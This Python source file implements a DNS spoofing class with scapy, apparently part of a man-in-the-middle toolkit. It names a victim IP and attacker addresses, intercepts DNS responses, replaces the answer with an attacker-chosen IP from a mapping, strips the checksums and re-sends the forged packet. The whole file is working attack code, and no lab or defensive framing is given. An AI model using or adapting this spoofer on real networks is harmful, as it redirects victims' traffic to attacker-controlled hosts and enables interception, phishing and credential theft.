from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
from scapy.layers.inet6 import IPv6


class DNSSpoofer:
    def __init__(self, interface, victim_ip, dns_mapping, attacker_ip, attacker_ipv6, logger):
        self.interface = interface
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip
        self.attacker_ipv6 = attacker_ipv6
        self.dns_mapping = dns_mapping  # { "example.com": "1.2.3.4" }
        self.logger = logger
        self.running = False

    def start(self):
        self.running = True

    def stop(self):
        self.running = False

    def log(self, msg):
        if self.logger:
            self.logger(msg)
        else:
            print(msg)

    def _get_src_ip(self, packet):
        if packet.haslayer(IP):
            return packet[IP].src, IP
        if packet.haslayer(IPv6):
            return packet[IPv6].src, IPv6
        return None, None
    
    def _dns_filter(self, packet):
        if packet.haslayer(DNSRR):
            try:
                # Get the domain name of the DNS request
                qname = packet[DNSQR].qname
                domain = (
                    qname.decode("utf-8", errors="ignore").rstrip(".")
                    if isinstance(qname, bytes)
                    else str(qname).rstrip(".")
                )
                spoof_ip = self.dns_mapping.get(domain)
                if not spoof_ip:
                    # Skip if we don't want to spoof this IP
                    return False
                # Set the spoofed IP.
                packet[DNS].an = DNSRR(rrname=qname, rdata=spoof_ip)
                # Set nr. of answers to 1.
                packet[DNS].ancount = 1
                # Remove checksums
                del packet[IP].len
                del packet[IP].chksum
                del packet[UDP].len
                del packet[UDP].chksum
                # Send modified packet and return that we spoofed it.
                send(packet, iface=self.interface, verbose=0)
                self.logger(f"Spoofed {domain}")
                return True
            except Exception as e:
                self.logger(f"DNS filter error: {e}")
                return False
        return False